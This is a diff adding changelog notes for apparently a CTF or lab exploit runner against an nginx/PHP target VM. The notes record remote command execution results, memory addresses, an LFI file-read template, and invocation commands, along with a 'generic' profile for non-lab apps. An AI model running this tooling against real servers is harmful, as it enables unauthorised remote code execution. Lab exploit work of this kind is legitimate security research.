@@ -453,3 +453,42 @@ Last updated: 2026-05-15 05:32:17 CEST
 ```bash
 ./demo_ctf_exploit_v1_6.py --host 192.168.1.205 --port 19321 --clear --require-reset-core --rounds 2 --exec-cmd id
 ```
+
+### v1.7/v1.8 Demo Runner Pass
+
+- Added `demo_ctf_exploit_v1_7.py` as a more autonomous recording runner:
+  - `--cmd` is the default command-capture path,
+  - reset-core use, binary fingerprinting, cleanup, strict preflight, and two exploit rounds are selected by default,
+  - command output is printed as the final terminal section with wrapping/truncation.
+- Validated v1.7 on target VM `192.168.1.205`:
+  - OS `Ubuntu 22.04.3 LTS`, nginx `1.31.0`, PHP `8.1.2-1ubuntu2.23`, libc `2.35-0ubuntu3.13`,
+  - nginx build ID `060e053ab1fa1a2876b7fe0ff4eff0cc777857b6`,
+  - libc build ID `095c7ba148aeca81668091f718047078d57efddb`,
+  - first final candidate `0x55e4210b2127` at body offset `1376` executed the requested command,
+  - artifact: `artifacts/demo_v1_7_20260515-054057.json`.
+- Added `demo_ctf_exploit_v1_8.py` as the current operator-facing runner:
+  - compact output by default,
+  - `-v` for detailed probe/candidate trace,
+  - focused colored `--help` plus full `--advanced-help`,
+  - CVE/bug/fixed-release context in help and start banner,
+  - modular HTTP file-read adapter with a default query-param vector and a custom `--file-read-template`,
+  - `--target-profile generic` for non-lab CTF apps where this fork's nginx config assertions should not apply.
+- Smoke-tested the file-read adapter against `192.168.1.205`:
+  - default query-param adapter read `randomize_va_space=2`,
+  - template adapter `http://{host}:{port}/lfi.php?file={path_url}{range_query}` read `randomize_va_space=2`.
+- Validated v1.8 compact mode on target VM:
+  - command: `./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --cmd 'id; uname -a; seq 1 20' --fast --artifact-dir artifacts`,
+  - selected geometry `A=127`, `plus=962`,
+  - fresh reset core produced `60` candidates before final filtering,
+  - first winning address `0x55e4210b2127`, body offset `1376`,
+  - artifact: `artifacts/demo_v1_8_20260515-055614.json`.
+- Validated v1.8 template-backed mode end-to-end:
+  - command used `--file-read-template 'http://{host}:{port}/lfi.php?file={path_url}{range_query}'`,
+  - first winning address `0x55e4210b2127`, body offset `1376`,
+  - captured `id` output as `uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)`,
+  - artifact: `artifacts/demo_v1_8_20260515-055639.json`.
+- Current preferred recording command:
+
+```bash
+./demo_ctf_exploit_v1_8.py --host 192.168.1.205 --port 19321 --cmd id --clear
+```
